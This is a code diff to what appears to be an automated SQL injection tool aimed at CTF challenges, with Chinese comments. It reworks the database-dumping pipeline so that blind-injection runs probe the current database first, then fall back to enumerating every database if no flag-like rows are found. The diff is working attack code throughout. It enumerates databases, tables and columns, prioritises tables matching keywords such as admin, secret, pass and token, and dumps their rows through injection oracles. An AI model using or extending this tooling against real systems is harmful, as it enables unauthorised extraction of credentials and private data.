@@ -16,6 +16,7 @@ from .oracles import BaseOracle, BoolOracle, OracleError, TimeOracle
 from .session import HttpSession
 
 INTERESTING = re.compile(r"flag|user|admin|secret|key|pass|token|config", re.I)
+FLAGISH = re.compile(r"ctfshow\{|flag\{", re.I)   # flag 样式内容（非表列名）
 
 # 盲注通道 flag 优先探测：like 'ctfshow{%' / 'flag{%' 的十六进制字面量
 # （引号可能被滤，hex 字面量最稳）
@@ -414,59 +415,71 @@ class ExtractionPipeline:
                     return res
             self.log("INFO", f"[脱库] 表名提示 {hint} 未命中 flag 行，回退全库枚举")
 
-        res.databases = self.list_databases()
-        self.log("INFO", f"[脱库] 所有数据库: {res.databases}")
+        # 时间盲注通道：全库枚举太贵（库名清单 60 字符 ≈ 5 分钟睡眠），
+        # 先只打当前库（CTF 的 flag 几乎总在当前库），找不到再回退全库枚举
+        blind = self._is_blind()
+        first_pass_only_current = blind and not dump_all_dbs
 
-        # 默认覆盖全部用户库（CTF 常见跨库 flag：当前库 geek，flag 在 ctf.Flag）
-        if dump_all_dbs:
-            targets = res.databases
-        else:
-            targets = [d for d in res.databases
-                       if d.lower() not in SYSTEM_DBS] or [res.database]
-        for db in targets:
-            if self.s.stopped:
-                break
-            tables = self.list_tables(db)
-            res.tables[db] = tables
-            self.log("INFO", f"[脱库] {db} 的表: {tables}")
-
-        # 取全部列结构
-        for db, tables in res.tables.items():
-            for t in tables:
+        def _enumerate_and_dump(full: bool = True):
+            if full:
+                res.databases = self.list_databases()
+                self.log("INFO", f"[脱库] 所有数据库: {res.databases}")
+                # 默认覆盖全部用户库（CTF 常见跨库 flag：当前库 geek，flag 在 ctf.Flag）
+                targets = res.databases if dump_all_dbs else                     [d for d in res.databases
+                     if d.lower() not in SYSTEM_DBS] or [res.database]
+            else:
+                # 时间盲注首传：只打当前库（flag 几乎总在当前库）
+                res.databases = [res.database]
+                targets = [res.database]
+            for db in targets:
                 if self.s.stopped:
                     break
-                cols = self.list_columns(db, t)
-                res.columns[(db, t)] = cols
-                self.log("INFO", f"[脱库] {db}.{t} 的列: {cols}")
+                tables = self.list_tables(db)
+                res.tables[db] = tables
+                self.log("INFO", f"[脱库] {db} 的表: {tables}")
+            # 取全部列结构
+            for db, tables in res.tables.items():
+                for t in tables:
+                    if self.s.stopped:
+                        break
+                    cols = self.list_columns(db, t)
+                    res.columns[(db, t)] = cols
+                    self.log("INFO", f"[脱库] {db}.{t} 的列: {cols}")
+            # 有干货的表优先（表名或列名命中关键词，如 1919810931114514 藏 flag 列）
+            hot = []
+            for (db, t), cols in res.columns.items():
+                pri = 2 if (INTERESTING.search(t)
+                            or any(INTERESTING.search(c) for c in cols)) else 1
+                hot.append((pri, db, t))
+            hot.sort(reverse=True)
+            for pri, db, t in hot:
+                if self.s.stopped:
+                    break
+                cols = res.columns.get((db, t), [])
+                if not cols:
+                    continue
+                # 关键词命中表全量导出；其余用户表也探前 3 行
+                n_rows = max_rows if pri == 2 else min(3, max_rows)
+                self.log("INFO", f"[脱库] 导出 {db}.{t} 前 {n_rows} 行（列名示例: "
+                                 f"{(cols[0][:20] + '…') if len(cols[0]) > 20 else cols[0]}）")
+                try:
+                    # 盲注通道：先试 flag 优先捷径（全表 group_concat 盲拖代价太高）
+                    if self._is_blind():
+                        rows = self.try_flag_first(db, t, cols)
+                        if rows is not None:
+                            res.rows[(db, t)] = rows
+                            continue
+                    res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
+                except OracleError as e:
+                    # 单表失败（超长 payload 被拦/敏感词）不阻断其余表
+                    self.log("WARN", f"[脱库] {db}.{t} 导出失败（跳过）: {str(e)[:90]}")
 
-        # 有干货的表优先（表名或列名命中关键词，如数字表名 1919810931114514 藏 flag 列）
-        hot = []
-        for (db, t), cols in res.columns.items():
-            pri = 2 if (INTERESTING.search(t)
-                        or any(INTERESTING.search(c) for c in cols)) else 1
-            hot.append((pri, db, t))
-        hot.sort(reverse=True)
-
-        for pri, db, t in hot:
-            if self.s.stopped:
-                break
-            cols = res.columns.get((db, t), [])
-            if not cols:
-                continue
-            # 关键词命中表全量导出；其余用户表也探前 3 行
-            # （FinalSQL 类：列名是一串 ~，表名/列名均不含关键词，数据藏在其中）
-            n_rows = max_rows if pri == 2 else min(3, max_rows)
-            self.log("INFO", f"[脱库] 导出 {db}.{t} 前 {n_rows} 行（列名示例: "
-                             f"{(cols[0][:20] + '…') if len(cols[0]) > 20 else cols[0]}）")
-            try:
-                # 盲注通道：先试 flag 优先捷径（全表 group_concat 盲拖代价太高）
-                if self._is_blind():
-                    rows = self.try_flag_first(db, t, cols)
-                    if rows is not None:
-                        res.rows[(db, t)] = rows
-                        continue
-                res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
-            except OracleError as e:
-                # 单表失败（超长 payload 被拦/敏感词）不阻断其余表
-                self.log("WARN", f"[脱库] {db}.{t} 导出失败（跳过）: {str(e)[:90]}")
+        _enumerate_and_dump(full=not first_pass_only_current)
+        if first_pass_only_current and not self.s.stopped:
+            # 当前库没摸到 flag 样式的行 → 回退全库枚举补一遍
+            has_flagish = any(FLAGISH.search(str(v)) for row in res.rows.values()
+                              for v in row.values())
+            if not has_flagish:
+                self.log("INFO", "[脱库] 当前库未见 flag 样式行，回退全库枚举")
+                _enumerate_and_dump()
         return res
